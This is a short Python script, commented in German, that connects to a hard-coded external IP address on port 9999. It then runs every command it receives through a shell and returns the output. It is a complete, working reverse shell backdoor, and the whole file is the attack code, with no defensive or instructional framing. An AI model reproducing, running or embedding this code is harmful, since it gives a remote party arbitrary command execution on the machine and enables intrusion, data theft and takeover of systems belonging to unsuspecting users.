import socket
import subprocess

def main():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(("193.111.248.178", 9999))  # Ersetzen Sie SERVER_IP mit der tatsächlichen IP-Adresse des Servers
        print("Verbunden mit dem Server")

        while True:
            command = client.recv(4096).decode()


            if command:
                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                    if not output.strip():
                        output = "Erfolgreich ausgeführt."
                except Exception as e:
                    output = str(e)

                client.send(output.encode())

    except Exception as e:
        print(f"Ein Fehler ist aufgetreten: {e}")

if __name__ == '__main__':
    main()
